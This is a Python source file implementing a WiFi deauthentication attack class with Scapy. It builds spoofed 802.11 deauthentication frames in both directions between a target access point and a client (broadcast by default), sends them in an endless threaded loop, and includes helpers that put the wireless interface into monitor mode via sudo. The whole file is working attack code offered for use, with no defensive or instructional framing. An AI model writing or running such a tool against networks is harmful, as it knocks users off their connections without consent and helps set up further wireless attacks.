from scapy.all import (
    RadioTap,    # For adding radio headers
    Dot11,       # For 802.11 WiFi headers
    Dot11Deauth, # For deauthentication frames
    sendp        # For sending packets
)
import time
import threading
from utils.logger import setup_logger

class DeauthAttack:
    """Class for performing WiFi deauthentication attacks."""

    def __init__(self):
        self.logger = setup_logger()
        self.running = False
        self.thread = None

    def start_attack(self, target_bssid, interface, client_mac="FF:FF:FF:FF:FF:FF", 
                    count=None, interval=0.1):
        """
        Start a deauthentication attack on a specific network.
        
        Args:
            target_bssid (str): BSSID of the target access point
            interface (str): Wireless interface to use
            client_mac (str): MAC address of client to deauth (default: broadcast)
            count (int): Number of deauth packets to send (default: None/infinite)
            interval (float): Interval between packets in seconds
        """
        try:
            # Validate parameters
            if not self._validate_mac(target_bssid):
                raise ValueError(f"Invalid BSSID format: {target_bssid}")
            
            if not self._validate_mac(client_mac):
                raise ValueError(f"Invalid client MAC format: {client_mac}")

            # Check if interface is in monitor mode
            if not self._check_monitor_mode(interface):
                raise Exception(f"Interface {interface} is not in monitor mode")

            self.running = True
            self.thread = threading.Thread(
                target=self._deauth_thread,
                args=(target_bssid, interface, client_mac, count, interval)
            )
            self.thread.daemon = True
            self.thread.start()

            self.logger.info(
                f"Started deauthentication attack on {target_bssid} "
                f"using interface {interface}"
            )

        except Exception as e:
            self.logger.error(f"Failed to start deauthentication attack: {str(e)}")
            raise

    def stop_attack(self):
        """Stop the running deauthentication attack."""
        try:
            self.running = False
            if self.thread and self.thread.is_alive():
                self.thread.join(timeout=2.0)
            self.logger.info("Deauthentication attack stopped")

        except Exception as e:
            self.logger.error(f"Error stopping deauthentication attack: {str(e)}")
            raise

    def _deauth_thread(self, target_bssid, interface, client_mac, count, interval):
        """Thread function for sending deauthentication packets."""
        try:
            # Create deauth packet
            deauth_packet = (
                RadioTap() /
                Dot11(
                    type=0,      # Management frame
                    subtype=12,  # Deauthentication
                    addr1=client_mac,
                    addr2=target_bssid,
                    addr3=target_bssid
                ) /
                Dot11Deauth(reason=7)  # Class 3 frame received from nonassociated STA
            )

            # Create deauth packet in opposite direction
            deauth_packet2 = (
                RadioTap() /
                Dot11(
                    type=0,
                    subtype=12,
                    addr1=target_bssid,
                    addr2=client_mac,
                    addr3=target_bssid
                ) /
                Dot11Deauth(reason=7)
            )

            packets_sent = 0
            while self.running:
                try:
                    # Send deauth packets in both directions
                    sendp(deauth_packet, iface=interface, verbose=False)
                    sendp(deauth_packet2, iface=interface, verbose=False)
                    packets_sent += 2

                    if count and packets_sent >= count * 2:
                        self.logger.info(
                            f"Completed sending {count} deauthentication packets")
                        break

                    time.sleep(interval)

                except Exception as e:
                    self.logger.error(
                        f"Error sending deauthentication packet: {str(e)}")
                    # Continue trying to send packets

        except Exception as e:
            self.logger.error(f"Deauthentication thread error: {str(e)}")
            self.running = False

    def _validate_mac(self, mac_address):
        """
        Validate MAC address format.
        
        Args:
            mac_address (str): MAC address to validate
            
        Returns:
            bool: True if valid, False otherwise
        """
        try:
            # Check basic format (XX:XX:XX:XX:XX:XX)
            if len(mac_address) != 17:
                return False

            parts = mac_address.split(':')
            if len(parts) != 6:
                return False

            # Validate each hexadecimal part
            return all(len(part) == 2 and int(part, 16) >= 0 
                      for part in parts)

        except Exception:
            return False

    def _check_monitor_mode(self, interface):
        """
        Check if the wireless interface is in monitor mode.
        
        Args:
            interface (str): Name of the wireless interface
            
        Returns:
            bool: True if in monitor mode, False otherwise
        """
        try:
            # This implementation is Linux-specific
            # For other operating systems, different commands would be needed
            import subprocess
            output = subprocess.check_output(
                ['iwconfig', interface], 
                stderr=subprocess.STDOUT
            ).decode()

            return 'Mode:Monitor' in output

        except Exception as e:
            self.logger.error(
                f"Error checking monitor mode for interface {interface}: {str(e)}")
            return False

    def set_monitor_mode(self, interface):
        """
        Attempt to set the wireless interface to monitor mode.
        
        Args:
            interface (str): Name of the wireless interface
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # This implementation is Linux-specific
            import subprocess
            
            # Bring interface down
            subprocess.check_call(['sudo', 'ifconfig', interface, 'down'])
            
            # Set monitor mode
            subprocess.check_call(['sudo', 'iwconfig', interface, 'mode', 'monitor'])
            
            # Bring interface back up
            subprocess.check_call(['sudo', 'ifconfig', interface, 'up'])
            
            self.logger.info(f"Successfully set {interface} to monitor mode")
            return True

        except Exception as e:
            self.logger.error(
                f"Failed to set {interface} to monitor mode: {str(e)}")
            return False
